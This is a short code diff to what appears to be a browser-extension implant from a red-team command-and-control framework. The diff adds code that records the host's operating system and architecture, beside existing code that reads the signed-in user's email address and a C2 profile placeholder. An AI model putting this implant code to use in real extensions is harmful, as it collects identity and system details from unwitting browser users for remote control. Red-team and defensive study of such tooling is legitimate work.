@@ -9,6 +9,8 @@ class implant{
     }
 }
 
+var hostos = "";
+var hostarch = "";
 var apfell = new implant();
 //--------------Base C2 INFORMATION---------------------------------------
 class baseC2 {
@@ -63,6 +65,11 @@ C2PROFILE_HERE
 //-------------SHARED COMMAND CODE ------------------------
 chrome.identity.getProfileUserInfo(function(info){
     apfell.userinfo = info.email;
+});
+
+chrome.runtime.getPlatformInfo(function(info) {
+    hostos = info.os;
+    hostarch = info.arch;
 });
 
 default_load = function(contents){
